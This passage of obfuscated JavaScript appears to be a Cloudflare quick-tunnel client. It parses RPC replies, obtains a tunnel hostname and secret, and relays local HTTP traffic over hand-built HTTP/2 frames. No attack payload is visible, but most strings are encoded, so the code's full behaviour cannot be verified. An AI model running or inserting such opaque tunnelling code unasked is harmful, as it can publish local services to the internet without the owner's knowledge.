        'qwXSignODw5RCYbYzwnLAxzLzc4GrMLSzsbTzxjNzwqGC3vJy2vZC2z1BgX5lG',
        'zxjYB3i',
        'rMLSzsb0B28GBgfYz2u',
        'CMvHzezPBgu',
        'zvf0Aee',
        'zg9Iv0G',
        'CKfiA2e',
        'yxjJAa',
        'qgX5zgvSBc9UB2rLlxb0Eq',
        'CMvWzwf0',
        'DLHKBge',
        'tK9ju0vFuK9mrv9srvnqt05ervi',
        'r2Xwwgi',
        'C3rYDwn0uhrY',
        '8j+tPIbBq2fJAgvDifn0yxr1CYdLKB3KUk3NM5hMJQFNVjpLRzJJGii',
        'Ec1HzxmTzw5JCNLWDgvK',
        'EePYuhG',
        'q2XLyw5SEsbJBg9Zzwq',
        'ywXSB2m',
        'wNPsDeG',
        'CNvUuhjVBwLZzq',
        'C3bSAxq',
        'n3W2Fdn8nhWXFdj8nxWWFdG',
        'C29Tzq',
        'y1bZu1C',
        'EKjZuM0',
        'zxjYB3jZ',
        'BMvnDe4',
        'tK9rz1O',
        'CNHjALK',
        'zxfez24',
        'y29Kzq',
        'rwLnv1a',
        'x3bYB2nLC3nuzxjTAw5HBe1LC3nHz2u',
        '5O+H5OMl5PYQ5A6m5OIq77Ym5PEG5Rov6kEJ5A+g5PwW5O2U',
        'vevnueTfwv9nqvHFvfrmx0Hpvvjt',
        'sg9ZDdOG',
        'yun1sNa',
        'BwH0BKK',
        'y3jLyxrLvMvYAwz5',
        'C0vgzwW',
        'zgvIDwC',
        'wMvsD2q',
        'C2v0t25LDgLTzvrHC2TZ',
        'D2LUzg93v2fPDgvYCW',
        's1rVEem',
        'vwXzsum',
        'DgfN',
        'DgvYBwLUywW',
        'zxjYB3jLza',
        'y29UDhjVBa',
        'rMfPBgvKihrVihbHCNnLifvstcbMCM9T',
        'De9iuuS',
        'B3jPz2LU',
        'yNvMzMvY',
        'sw5PDfrHC2S',
        'y29VA2LL',
        'CMvHzgfIBgu',
        'CMvXDwvZDa',
        'tMv4DxmTuhL0Ag9U',
        'zxHWB3j0CW',
        'BwvZC2fNzq',
        'wenMDvm',
        's0HqA3q',
        'BMTwqwy',
        'u3DRDhi',
        'qKLWAw8',
        'Cg9W',
        'Ec1JAhvUAY1Pza',
        'icaG4OcIia',
        'AhvyswG',
        'twTvsuK',
        'vgHwueS',
        'B1PbtMu',
        'tfvUEhG',
        'C2LNBMfS',
        't3zXqNK',
        'quH6z3a',
        'AM9PBG',
        'Devlvve',
        'C3rHCNq',
        'DwLK',
        'DwrRs3y',
        'zwPltfO',
        'serSvuq',
        'rufdze8',
        'Dg9qrNm',
        'Cxnjvwe',
        'whjgvuO',
        'mhW0Fdf8m3WY',
        'zM9UDc93B2zMmG',
        'qwnJzxnZlunVBNrYB2WTqwXSB3CTtwv0Ag9KCW',
        'qLfryLK',
        'y3rRq0e',
        'tMfwyKW',
        'y3j5ChrV',
        'Cg93',
        's09mvei',
        'Aw5WDxq',
        'nhWXFdb8m3WY',
        'tMLtvfC',
        'yKzjCfa',
        'thb3qMq',
        'rxPPDeO',
        'wxLpCw8',
        'A3rVswG',
        'AgvHzgvY',
        'y3jLyxrLuhvIBgLJs2v5',
        'tvDmCKC',
        'u3LZDgvTmZi',
        'zMu4mdO',
        'twLKzgXLD2fYzsbHChbSAwvKlcbZzxr0Aw5NihvWihjVDxrLCY4UlG',
        'rwP2Chy',
        'C2vJlxDLyNnVy2TLDc1RzxK',
        'CNfbuNm',
        'sfzqrNC',
        'qMjQy0C',
        'Dhj1BMnHDgvKieHqqunlihn0CMLUzW'
    ];
    a0a = function () {
        return f9;
    };
    return a0a();
}
function a0ag(a, b) {
    const cE = a0aK, c = {
            'ZiDLV': function (j, k) {
                return j >= k;
            },
            'GVBZo': cE(0x445),
            'PHNAX': function (j, k) {
                return j & k;
            },
            'NrZaS': cE(0x148),
            'uGLJa': function (j, k) {
                return j & k;
            },
            'EzitJ': function (j, k) {
                return j >> k;
            },
            'XdkFF': function (j, k) {
                return j & k;
            },
            'hdPra': function (j, k) {
                return j + k;
            },
            'KZldW': function (j, k) {
                return j + k;
            },
            'KRFzQ': function (j, k) {
                return j(k);
            },
            'tdZIU': function (j, k) {
                return j < k;
            },
            'LVYut': function (j, k) {
                return j > k;
            }
        };
    if (c['ZiDLV'](b, a[cE(0x5a7)]))
        throw new Error(c[cE(0x6a5)]);
    const d = a[b];
    if (c['PHNAX'](d, 0x3n) !== 0x0n)
        throw new Error(c[cE(0x665)]);
    let f = c[cE(0x123)](c['EzitJ'](d, 0x2n), 0x3fffffffn);
    c[cE(0x64a)](f, 0x20000000n) && (f -= 0x40000000n);
    const g = c['hdPra'](c[cE(0x4d2)](b, 0x1), Number(f)), h = c['KRFzQ'](Number, d >> 0x20n & 0xffffn), i = c[cE(0x330)](Number, c[cE(0x58e)](d, 0x30n) & 0xffffn);
    if (c['tdZIU'](g, 0x0) || c[cE(0x379)](c['hdPra'](c[cE(0x4d2)](g, h), i), a[cE(0x5a7)]))
        throw new Error(c[cE(0x6a5)]);
    return [
        g,
        h,
        i
    ];
}
function a0ah(a, b) {
    const cF = a0aK, c = {
            'seVLH': function (m, n) {
                return m >= n;
            },
            'KEPbB': function (m, n) {
                return m & n;
            },
            'pShFq': function (m, n) {
                return m >> n;
            },
            'zRtoN': function (m, n) {
                return m + n;
            },
            'EVlqL': function (m, n) {
                return m >> n;
            },
            'kqHLr': function (m, n) {
                return m / n;
            },
            'jppIF': function (m, n) {
                return m !== n;
            },
            'Ejvpv': function (m, n) {
                return m < n;
            },
            'lqQSZ': function (m, n) {
                return m > n;
            },
            'mYdhC': function (m, n) {
                return m * n;
            },
            'jXjGR': function (m, n) {
                return m & n;
            },
            'LqasA': function (m, n) {
                return m * n;
            },
            'nSVRd': 'utf8'
        };
    if (c[cF(0x18f)](b, a[cF(0x5a7)]))
        return '';
    const d = a[b];
    if (c[cF(0x2b8)](d, 0x3n) !== 0x1n)
        return '';
    let f = c[cF(0x2b8)](c[cF(0x683)](d, 0x2n), 0x3fffffffn);
    f & 0x20000000n && (f -= 0x40000000n);
    const g = c[cF(0x1a2)](c[cF(0x1a2)](b, 0x1), Number(f)), h = Number(c[cF(0x2b8)](d >> 0x20n, 0x7n)), j = Number(c[cF(0x3ce)](d, 0x23n)), k = Math['ceil'](c[cF(0x413)](j, 0x8));
    if (c[cF(0x261)](h, 0x2) || c[cF(0x597)](g, 0x0) || c[cF(0x452)](c[cF(0x1a2)](g, k), a[cF(0x5a7)]))
        return '';
    const l = Buffer[cF(0x539)](c[cF(0x381)](k, 0x8));
    for (let m = 0x0; m < k; m++) {
        l['writeBigUInt64LE'](c[cF(0x1fe)](a[g + m], 0xffffffffffffffffn), c[cF(0x699)](m, 0x8));
    }
    return l[cF(0x626)](0x0, j)[cF(0x206)](c['nSVRd'])['replace'](/\0+$/, '');
}
function a0ai(a) {
    const cG = a0aK, b = {
            'BIpio': function (z, A) {
                return z % A;
            },
            'GQsTp': function (z, A) {
                return z < A;
            },
            'ozbvI': function (z, A) {
                return z < A;
            },
            'dmchn': function (z, A) {
                return z / A;
            },
            'yksRl': function (z, A) {
                return z * A;
            },
            'MRfyb': function (y, z, A) {
                return y(z, A);
            },
            'NLsDH': function (z, A) {
                return z !== A;
            },
            'neMtN': function (z, A) {
                return z & A;
            },
            'JiXTy': cG(0x179),
            'KCMEX': function (z, A) {
                return z + A;
            },
            'PiopK': function (y, z) {
                return y(z);
            },
            'OwNJx': function (z, A) {
                return z >> A;
            },
            'nZtoQ': function (z, A) {
                return z + A;
            },
            'EdTuJ': 'RPC\x20return\x20union\x20',
            'XXcXH': function (z, A) {
                return z + A;
            },
            'fJqUs': function (z, A) {
                return z === A;
            },
            'dVImS': function (z, A) {
                return z + A;
            }
        };
    if (b[cG(0x569)](a[cG(0x5a7)], 0x8) || b[cG(0x2fd)](a[cG(0x5a7)], 0x18))
        throw new Error(cG(0x308));
    const c = [];
    for (let y = 0x0; b[cG(0x661)](y, b[cG(0x44f)](a[cG(0x5a7)], 0x8)); y++) {
        c[cG(0x293)](a['readBigUInt64LE'](b[cG(0x26d)](y, 0x8)));
    }
    let d, f, g;
    [d, f, g] = b[cG(0x2a5)](a0ag, c, 0x0);
    if (b[cG(0x2fd)](f, 0x1) || b['NLsDH'](b['neMtN'](c[d], 0xffffn), 0x3n))
        throw new Error(b[cG(0x474)]);
    let h, j, k;
    [h, j, k] = a0ag(c, b['KCMEX'](d, f));
    const l = b[cG(0x688)](Number, b['neMtN'](b[cG(0x63d)](c[h], 0x30n), 0xffffn));
    if (l === 0x1)
        return {
            'ok': ![],
            'error': a0ah(c, b['nZtoQ'](h, j))
        };
    if (b['NLsDH'](l, 0x0))
        return {
            'ok': ![],
            'error': b[cG(0x49c)] + l
        };
    let m, n, o;
    [m, n, o] = a0ag(c, b[cG(0x2b5)](h, j));
    let p, q, r;
    [p, q, r] = a0ag(c, b[cG(0x668)](m, n));
    const s = c[p], t = Number(b[cG(0x542)](s, 0xffffn));
    if (b[cG(0x5d8)](t, 0x0))
        return {
            'ok': ![],
            'error': b[cG(0x2a5)](a0ah, c, p + q)
        };
    if (b['NLsDH'](t, 0x1))
        return {
            'ok': ![],
            'error': b[cG(0x471)](cG(0x1aa), t)
        };
    let u, v, w;
    [u, v, w] = a0ag(c, b[cG(0x668)](p, q));
    const x = a0ah(c, b['dVImS'](u + v, 0x1));
    return {
        'ok': !![],
        'location': x,
        'remoteManaged': b[cG(0x688)](Boolean, b['neMtN'](c[u], 0x1n))
    };
}
const a0aj = {
    '.js': 'text/javascript;\x20charset=utf-8',
    '.mjs': a0aK(0x296),
    '.css': a0aK(0x4e9),
    '.json': a0aK(0x614),
    '.map': a0aK(0x614),
    '.wasm': a0aK(0x6ea),
    '.html': 'text/html;\x20charset=utf-8',
    '.htm': 'text/html;\x20charset=utf-8',
    '.svg': 'image/svg+xml',
    '.xml': 'application/xml',
    '.woff': a0aK(0x581),
    '.woff2': a0aK(0x581),
    '.png': a0aK(0x373),
    '.jpg': a0aK(0x29d),
    '.jpeg': a0aK(0x29d),
    '.gif': a0aK(0x3e0),
    '.ico': a0aK(0x6a1)
};
function a0ak(a) {
    const cH = a0aK, b = {
            'GrxxV': function (f, g) {
                return f < g;
            }
        }, c = a['endsWith']('/') ? a['slice'](0x0, -0x1) : a, d = c[cH(0x5f9)]('.');
    if (b['GrxxV'](d, 0x0))
        return '';
    return a0aj[c[cH(0x1f8)](d)['toLowerCase']()] || '';
}
function a0al(a) {
    const cI = a0aK, b = {
            'LVhNr': function (c, d) {
                return c !== d;
            },
            'SNHYp': cI(0x6b0),
            'mQpzR': 'quick\x20tunnel\x20secret\x20has\x20an\x20unexpected\x20type',
            'aXMUx': function (c, d) {
                return c + d;
            },
            'Ougsm': function (c, d) {
                return c % d;
            },
            'LgVAC': cI(0x4d0)
        };
    if (Array['isArray'](a))
        return Buffer[cI(0x4e8)](a);
    if (b[cI(0x2c2)](typeof a, b[cI(0x1ed)]))
        throw new Error(b[cI(0x60c)]);
    return Buffer[cI(0x4e8)](b['aXMUx'](a, '='[cI(0x530)](b[cI(0x482)](-a[cI(0x5a7)], 0x4))), b[cI(0x162)]);
}
const a0am = /^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$/;
function a0an(a) {
    const cJ = a0aK, b = {
            'RVFnx': function (c, d) {
                return c(d);
            },
            'KAaGR': function (c, d) {
                return c + d;
            },
            'tOHQK': function (c, d) {
                return c + d;
            },
            'SRAiF': cJ(0x42a),
            'VyjXt': cJ(0x320),
            'TUAPA': cJ(0x6b0),
            'bYFHT': function (c, d) {
                return c !== d;
            },
            'fKEZk': cJ(0x6ac),
            'vorBq': cJ(0x528),
            'GTjtS': cJ(0x42b),
            'CvGXx': cJ(0x6de),
            'sBUrr': function (c, d) {
                return c + d;
            },
            'nXdgC': cJ(0x5aa),
            'fUsGh': function (c, d) {
                return c === d;
            },
            'etOFq': 'https:',
            'UhYph': cJ(0x32a),
            'gLxGv': cJ(0x273),
            'SEChX': cJ(0x5a6)
        };
    return new Promise((c, d) => {
        const cK = cJ, f = {
                'kvwDG': cK(0x5c8),
                'taXtU': function (j, k) {
                    return b['RVFnx'](j, k);
                },
                'dVSrG': function (j, k) {
                    const cL = cK;
                    return b[cL(0x6ab)](j, k);
                },
                'SoVHW': function (j, k) {
                    const cM = cK;
                    return b[cM(0x55b)](j, k);
                },
                'VtBwe': b[cK(0x5d6)],
                'NFotK': function (j, k) {
                    return j + k;
                },
                'HVPFw': b[cK(0x30e)],
                'kCeyk': cK(0x25f),
                'QBPHH': b['TUAPA'],
                'RObSO': function (j, k) {
                    const cN = cK;
                    return b[cN(0x2cb)](j, k);
                },
                'OhuDh': cK(0x4b5),
                'dhvqO': function (j, k) {
                    return j(k);
                },
                'pyeaC': b['fKEZk'],
                'LRMYr': b['vorBq'],
                'fnOvf': b[cK(0x34f)]
            };
        let g;
        try {
            g = new URL(a['replace'](/\/+$/, '') + b[cK(0x6f3)]);
        } catch (j) {
            d(new Error(b['sBUrr'](b['nXdgC'], j[cK(0x564)])));
            return;
        }
        const h = b[cK(0x36f)](g['protocol'], b['etOFq']) ? a0h : a0g, i = h['request'](g, {
                'method': b[cK(0x1d3)],
                'headers': {
                    'Content-Type': b['gLxGv'],
                    'User-Agent': b[cK(0x11c)]
                },
                'timeout': 0x3a98
            }, k => {
                const cO = cK, l = [];
                k['on'](f[cO(0x69a)], m => l[cO(0x293)](m)), k['on'](f[cO(0x5dc)], d), k['on'](f[cO(0x6ca)], () => {
                    const cP = cO, m = Buffer['concat'](l), n = k[cP(0x328)];
                    let o;
                    try {
                        o = JSON[cP(0x110)](m['toString'](f[cP(0x51c)]));
                    } catch (q) {
                        f[cP(0x2bc)](d, new Error(f['dVSrG'](f[cP(0x629)](f['VtBwe'], n), cP(0x2b9)) + m[cP(0x626)](0x0, 0x12c)[cP(0x206)](f[cP(0x51c)])));
                        return;
                    }
                    const p = o[cP(0x43b)] || {};
                    if (!(o[cP(0x507)] ?? !![]) || !p) {
                        d(new Error(f[cP(0x345)](f[cP(0x59a)], JSON['stringify'](o[cP(0x541)]))));
                        return;
                    }
                    try {
                        const r = String(p['id']);
                        if (!a0am[cP(0x4ea)](r))
                            throw new Error(f[cP(0x5f8)]);
                        if (typeof p['account_tag'] !== f['QBPHH'] || f['RObSO'](typeof p['hostname'], cP(0x6b0)))
                            throw new Error(f['OhuDh']);
                        const s = a0al(p['secret']), t = Buffer[cP(0x4e8)](r['replace'](/-/g, ''), cP(0x398));
                        c([
                            p[cP(0x214)],
                            p['account_tag'],
                            s,
                            t
                        ]);
                    } catch (u) {
                        f[cP(0x13c)](d, new Error(cP(0x649) + u[cP(0x564)]));
                    }
                });
            });
        i['on'](b[cK(0x28d)], k => d(new Error(cK(0x5aa) + k['message']))), i[cK(0x42b)]();
    });
}
function a0ao(a) {
    const cQ = a0aK;
    return a[cQ(0x5b6)](([b, c]) => Buffer[cQ(0x4e8)](b, cQ(0x5c8))['toString']('base64')[cQ(0x4bd)](/=+$/, '') + ':' + Buffer[cQ(0x4e8)](c, 'utf8')[cQ(0x206)](cQ(0x4d0))[cQ(0x4bd)](/=+$/, ''))[cQ(0x575)](';');
}
class a0ap {
    constructor(a) {
        const cR = a0aK, b = {
                'wIPyh': 'data',
                'aCuJp': cR(0x42b),
                'PvikT': 'close'
            };
        this[cR(0x11a)] = a, this[cR(0x55d)] = Buffer[cR(0x539)](0x0), this['waiters'] = [], this['errored'] = null, this[cR(0x150)] = ![], a['on'](b[cR(0x4fa)], c => {
            const cS = cR;
            this[cS(0x55d)] = this[cS(0x55d)][cS(0x5a7)] ? Buffer['concat']([
                this[cS(0x55d)],
                c
            ]) : c, this[cS(0x6d1)]();
        }), a['on'](cR(0x528), c => {
            const cT = cR;
            this['errored'] = c, this[cT(0x6d1)]();
        }), a['on'](b[cR(0x54c)], () => {
            const cU = cR;
            this[cU(0x150)] = !![], this[cU(0x6d1)]();
        }), a['on'](b[cR(0x2ce)], () => {
            const cV = cR;
            this[cV(0x150)] = !![], this[cV(0x6d1)]();
        });
    }
    ['_drain']() {
        const cW = a0aK, a = {
                'jRvTk': function (b, c) {
                    return b >= c;
                },
                'ZRfbG': function (b, c) {
                    return b !== c;
                },
                'zOGgC': cW(0x1e2)
            };
        while (this[cW(0x274)][cW(0x5a7)] > 0x0) {
            const b = this[cW(0x274)][0x0];
            if (a[cW(0x223)](this[cW(0x55d)]['length'], b[cW(0x5db)])) {
                this[cW(0x274)][cW(0x5e3)]();
                const c = this[cW(0x55d)][cW(0x626)](0x0, b['need']);
                this[cW(0x55d)] = this[cW(0x55d)][cW(0x626)](b[cW(0x5db)]), b[cW(0x6d9)](c);
            } else {
                if (a['ZRfbG'](this['errored'], null))
                    this[cW(0x274)]['shift'](), b['reject'](this[cW(0x558)]);
                else {
                    if (this[cW(0x150)])
                        this['waiters'][cW(0x5e3)](), b[cW(0x39b)](new Error(a[cW(0x5f1)]));
                    else
                        break;
                }
            }
        }
    }
    ['readExact'](a) {
        const cX = a0aK, b = {
                'vSsME': function (c, d) {
                    return c !== d;
                },
                'URcJh': function (c, d) {
                    return c >= d;
                }
            };
        if (b['vSsME'](this['errored'], null))
            return Promise['reject'](this[cX(0x558)]);
        if (b[cX(0x3b1)](this[cX(0x55d)][cX(0x5a7)], a)) {
            const c = this[cX(0x55d)][cX(0x626)](0x0, a);
            return this[cX(0x55d)] = this[cX(0x55d)][cX(0x626)](a), Promise[cX(0x6d9)](c);
        }
        if (this['closed'])
            return Promise['reject'](new Error(cX(0x1e2)));
        return new Promise((d, f) => {
            const cY = cX;
            this[cY(0x274)][cY(0x293)]({
                'need': a,
                'resolve': d,
                'reject': f
            }), this[cY(0x6d1)]();
        });
    }
}
class a0aq {
    constructor(a, b, c, d, f, g, h, i = null, j = ![], k = null) {
        const cZ = a0aK, l = {
                'vSjkv': function (o, p) {
                    return o || p;
                }
            }, m = cZ(0x3ab)[cZ(0x53c)]('|');
        let n = 0x0;
        while (!![]) {
            switch (m[n++]) {
            case '0':
                this['origin'] = b;
                continue;
            case '1':
                this[cZ(0x59e)] = a0Z;
                continue;
            case '2':
                this['windowWaiters'] = [];
                continue;
            case '3':
                this[cZ(0x400)] = i;
                continue;
            case '4':
                this[cZ(0x43c)] = ![];
                continue;
            case '5':
                this['sock'] = a;
                continue;
            case '6':
                this[cZ(0x495)] = new a0a8();
                continue;
            case '7':
                this[cZ(0x5d4)] = l[cZ(0x513)](k, { 'printed': ![] });
                continue;
            case '8':
                this[cZ(0x634)] = ![];
                continue;
            case '9':
                this[cZ(0x200)] = d;
                continue;
            case '10':
                this[cZ(0x3d6)] = f;
                continue;
            case '11':
                this[cZ(0x156)] = j;
                continue;
            case '12':
                this['connectionWindow'] = 0xffff;
                continue;
            case '13':
                this[cZ(0x5c3)] = new Map();
                continue;
            case '14':
                this[cZ(0x182)] = g;
                continue;
            case '15':
                this[cZ(0x467)] = new a0ap(a);
                continue;
            case '16':
                this[cZ(0x348)] = h;
                continue;
            case '17':
                this[cZ(0x3b3)] = new Map();
                continue;
            case '18':
                this[cZ(0x221)] = c;
                continue;
            case '19':
                this['control'] = null;
                continue;
            }
            break;
        }
    }
    [a0aK(0x218)](a, b, c, d = Buffer[a0aK(0x539)](0x0)) {
        const d0 = a0aK, f = {
                'oFmXT': function (h, i) {
                    return h > i;
                },
                'lxezA': d0(0x422),
                'nQKTM': function (h, i) {
                    return h & i;
                }
            };
        if (f[d0(0x4b2)](d[d0(0x5a7)], 0xffffff))
            throw new Error(f[d0(0x3b5)]);
        const g = Buffer[d0(0x539)](0x9);
        g[d0(0x337)](d[d0(0x5a7)], 0x0, 0x3), g[0x3] = a, g[0x4] = b, g[d0(0x371)](f[d0(0x129)](c, 0x7fffffff), 0x5), this[d0(0x1e3)]['write'](Buffer[d0(0x117)]([
            g,
            d
        ]));
    }
    ['sendHeaders'](a, b, c = ![]) {
        const d1 = a0aK, d = {
                'hCJdI': function (h, i) {
                    return h(i);
                },
                'WwMQM': function (h, i) {
                    return h | i;
                }
            }, f = d[d1(0x2cc)](a0ab, b), g = d['WwMQM'](0x4, c ? 0x1 : 0x0);
        this[d1(0x218)](0x1, g, a, f);
    }
    ['_waitWindow'](a) {
        const d2 = a0aK, b = {
                'oeiWR': function (c, d) {
                    return c > d;
                }
            };
        if (b[d2(0x69b)](this['connectionWindow'], 0x0) && (this['streamWindows'][d2(0x12e)](a) ?? 0xffff) > 0x0)
            return Promise[d2(0x6d9)]();
        return new Promise(c => {
            const d3 = d2;
            this[d3(0x553)][d3(0x293)]({
                'streamId': a,
                'resolve': c
            });
        });
    }
    [a0aK(0x377)]() {
        const d4 = a0aK, a = {
                'TwetA': function (c, d) {
                    return c > d;
                }
            }, b = [];
        for (const c of this[d4(0x553)]) {
            const d = this[d4(0x3b3)][d4(0x12e)](c['streamId']) ?? 0xffff;
            a['TwetA'](this[d4(0x603)], 0x0) && a[d4(0x62a)](d, 0x0) ? c[d4(0x6d9)]() : b['push'](c);
        }
        this['windowWaiters'] = b;
    }
    [a0aK(0x380)]() {
        const d5 = a0aK;
        for (const a of this[d5(0x553)]) {
            a['resolve']();
        }
        this[d5(0x553)] = [];
    }
    async [a0aK(0x3c4)](a, b, c = ![]) {
        const d6 = a0aK, d = {
                'LYvyo': function (h, i) {
                    return h - i;
                },
                'hKGOS': function (h, i) {
                    return h + i;
                },
                'pRldS': function (h, i) {
                    return h < i;
                }
            }, f = b[d6(0x5a7)];
        let g = 0x0;
        do {
            await this[d6(0x693)](a);
            if (this['stopped'])
                return;
            const h = this[d6(0x3b3)][d6(0x12e)](a) ?? 0xffff, i = Math[d6(0x39c)](d['LYvyo'](f, g), this[d6(0x603)], h, this['peerMaxFrame']), j = c && d[d6(0x4a6)](g, i) >= f ? 0x1 : 0x0, k = b[d6(0x626)](g, d[d6(0x4a6)](g, i));
            this['connectionWindow'] -= i, this[d6(0x3b3)][d6(0x2d1)](a, h - i), this[d6(0x218)](0x0, j, a, k), g += i;
        } while (d[d6(0x38f)](g, f));
    }
    [a0aK(0x431)](a, b) {
        const d7 = a0aK, c = {
                'qsIUa': function (d, f) {
                    return d & f;
                }
            };
        if (b > 0x0) {
            const d = Buffer[d7(0x539)](0x4);
            d[d7(0x371)](c[d7(0x57e)](b, 0x7fffffff), 0x0), this['sendFrame'](0x8, 0x0, a, d);
        }
    }
    async ['readFrame']() {
        const d8 = a0aK, a = {
                'ZDCuy': function (i, j) {
                    return i & j;
                }
            }, b = await this[d8(0x467)][d8(0x2e5)](0x9), c = b[d8(0x3c1)](0x0, 0x3), d = b[0x3], f = b[0x4], g = a['ZDCuy'](b[d8(0x45f)](0x5), 0x7fffffff), h = await this[d8(0x467)][d8(0x2e5)](c);
        return [
            d,
            f,
            g,
            h
        ];
    }
    async [a0aK(0x419)](a, b, c) {
        const d9 = a0aK, d = {
                'qXNLL': function (g, h) {
                    return g & h;
                },
                'jlFOf': function (g, h) {
                    return g > h;
                },
                'awDCt': function (g, h) {
                    return g - h;
                },
                'oelvJ': function (g, h) {
                    return g !== h;
                },
                'AwKWu': d9(0x6ff)
            };
        if (d['qXNLL'](a, 0x8)) {
            const g = c[0x0];
            c = c[d9(0x626)](0x1);
            if (d['jlFOf'](g, c['length']))
                throw new Error(d9(0x49f));
            c = g ? c[d9(0x626)](0x0, d[d9(0x33a)](c['length'], g)) : c;
        }
        d['qXNLL'](a, 0x20) && (c = c[d9(0x626)](0x5));
        const f = [c];
        while (!d[d9(0x208)](a, 0x4)) {
            const h = await this[d9(0x5bb)]();
            if (d[d9(0x322)](h[0x0], 0x9) || d[d9(0x322)](h[0x2], b))
                throw new Error(d[d9(0x509)]);
            f[d9(0x293)](h[0x3]), a = h[0x1];
        }
        return this[d9(0x495)][d9(0x376)](Buffer[d9(0x117)](f));
    }
    [a0aK(0x45d)](a) {
        const da = a0aK, b = {
                'YNrWO': function (c, d) {
                    return c !== d;
                },
                'KHPkt': ':status'
            };
        if (b[da(0x43d)](this[da(0x559)], null))
            return;
        this[da(0x559)] = new a0as(this, a, this['log']), this[da(0x1de)](a, [[
                b[da(0x566)],
                da(0x6f4)
            ]]), this[da(0x559)][da(0x577)](this[da(0x221)], this[da(0x200)], this[da(0x3d6)], this['connIndex']);
    }
    [a0aK(0x642)](a, b) {
        const db = a0aK, c = {
                'zBsRm': db(0x5c8),
                'bVclm': function (g, h, i) {
                    return g(h, i);
                },
                'kURJb': db(0x5ac),
                'ucWiV': db(0x6f4),
                'qvtiH': db(0x234),
                'jlkIg': db(0x273),
                'RgkGH': 'content-length',
                'ThVPK': function (g, h) {
                    return g(h);
                }
            };
        let d = 0x0;
        try {
            const g = JSON[db(0x110)](b['length'] ? b[db(0x206)](c[db(0x540)]) : '{}'), h = c[db(0x408)](parseInt, g[db(0x646)], 0xa);
            !Number[db(0x278)](h) && (d = h);
        } catch (i) {
        }
        const f = Buffer[db(0x4e8)](JSON[db(0x397)]({ 'latestAppliedVersion': d }));
        this[db(0x1de)](a, [
            [
                c[db(0x477)],
                c[db(0x2d6)]
            ],
            [
                c[db(0x120)],
                c['jlkIg']
            ],
            [
                c[db(0x615)],
                c[db(0x56f)](String, f[db(0x5a7)])
            ]
        ]), this['sendData'](a, f, !![]);
    }
    ['requestFinished'](a, b) {
        const dc = a0aK, c = {
                'hrILN': '3|1|2|0|4',
                'wWdCp': function (g, h) {
                    return g === h;
                },
                'xNQur': dc(0x3ea)
            }, d = c[dc(0x284)]['split']('|');
        let f = 0x0;
        while (!![]) {
            switch (d[f++]) {
            case '0':
                b['finished'] = !![];
                continue;
            case '1':
                if (b['websocket'])
                    return;
                continue;
            case '2':
                if (b[dc(0x6e1)])
                    return;
                continue;
            case '3':
                if (c[dc(0x375)](b[dc(0x605)], c['xNQur'])) {
                    this[dc(0x642)](a, Buffer[dc(0x117)](b[dc(0x6f7)]));
                    return;
                }
                continue;
            case '4':
                this[dc(0x145)](a, b)[dc(0x23f)](() => {
                });
                continue;
            }
            break;
        }
    }
    async [a0aK(0x145)](a, b) {
        const dd = a0aK, c = {
                'Pzeni': function (d, f, g, h, i, j) {
                    return d(f, g, h, i, j);
                },
                'GHzRG': function (d, f) {
                    return d === f;
                },
                'VhrNF': dd(0x6ec),
                'AsZbr': 'cf-int-',
                'iYIVf': dd(0x475),
                'wYehd': dd(0x1a3),
                'AACGw': function (d, f) {
                    return d === f;
                },
                'DcoCa': 'connection',
                'OFicm': dd(0x605),
                'NiSTW': function (d, f) {
                    return d === f;
                },
                'rqARs': function (d, f) {
                    return d(f);
                },
                'acvgL': dd(0x234),
                'IpJYh': dd(0x5ac),
                'EbICI': dd(0x49b),
                'gabie': function (d, f) {
                    return d + f;
                },
                'idAPV': function (d, f) {
                    return d + f;
                },
                'GmyTB': function (d, f) {
                    return d + f;
                },
                'GRFTI': dd(0x2cf),
                'lbHcr': dd(0x652),
                'MPcFV': dd(0x288)
            };
        try {
            const d = await c[dd(0x125)](a0av, this[dd(0x55c)], b[dd(0x4a4)], b[dd(0x5d0)], b[dd(0x3c7)], Buffer['concat'](b[dd(0x6f7)])), f = [], g = [];
            for (const [k, l] of d[dd(0x3c7)]) {
                const m = k[dd(0x425)]();
                c[dd(0x60f)](m, c[dd(0x4ed)]) && g[dd(0x293)]([
                    m,
                    l
                ]);
                const n = m[dd(0x21e)](c['AsZbr']) || m[dd(0x21e)](c[dd(0x6c3)]) || m[dd(0x21e)](c[dd(0x350)]) || m[dd(0x21e)](':');
                (!n || c['AACGw'](m, c['DcoCa']) || m === c[dd(0x5f2)] || c[dd(0x58b)](m, dd(0x60b))) && f[dd(0x293)]([
                    m,
                    l
                ]);
            }
            if (!f[dd(0x53e)](([o]) => o === 'content-type')) {
                const o = c[dd(0x599)](a0ak, b['path']);
                o && f[dd(0x293)]([
                    c['acvgL'],
                    o
                ]);
            }
            const h = a0ao(f), i = d[dd(0x423)] === 0x65 ? 0xc8 : d['status'], j = [
                    [
                        c[dd(0x323)],
                        c[dd(0x599)](String, i)
                    ],
                    ...g,
                    [
                        c[dd(0x5da)],
                        h
                    ],
                    [
                        'cf-cloudflared-response-meta',
                        dd(0x359)
                    ]
                ];
            this[dd(0x1de)](a, j);
            for await (const p of d[dd(0x6f7)]) {
                await this[dd(0x3c4)](a, p, ![]);
            }
            await this[dd(0x3c4)](a, Buffer[dd(0x539)](0x0), !![]);
        } catch (q) {
            this[dd(0x348)][dd(0x6dd)](c[dd(0x524)](c[dd(0x6d2)](c[dd(0x26e)](c[dd(0x442)], a), c[dd(0x37f)]), q));
            try {
                this[dd(0x1de)](a, [[
                        c['IpJYh'],
                        c['MPcFV']
                    ]], !![]);
            } catch (r) {
            }
        }
    }
    async ['run']() {
        const de = a0aK, a = {
                'tPwek': de(0x3a1),
                'EiMWP': de(0x28f),
                'IOEdo': function (d, f) {
                    return d + f;
                },
                'EmGGh': function (d, f) {
                    return d === f;
                },
                'DVOKk': function (d, f) {
                    return d & f;
                },
                'huXIh': function (d, f) {
                    return d % f;
                },
                'aSUjQ': 'invalid\x20SETTINGS\x20payload',
                'lUwgM': function (d, f) {
                    return d - f;
                },
                'yjuMA': function (d, f) {
                    return d >= f;
                },
                'CasLS': function (d, f) {
                    return d & f;
                },
                'TOpVH': function (d, f) {
                    return d !== f;
                }
            }, b = await this[de(0x467)][de(0x2e5)](0x18);
        if (!b[de(0x5bf)](Buffer[de(0x4e8)](a[de(0x496)])))
            throw new Error(a[de(0x547)]);
        const c = Buffer[de(0x539)](0x6);
        c[de(0x289)](0x3, 0x0), c[de(0x371)](0x64, 0x2), this['sendFrame'](0x4, 0x0, 0x0, c);
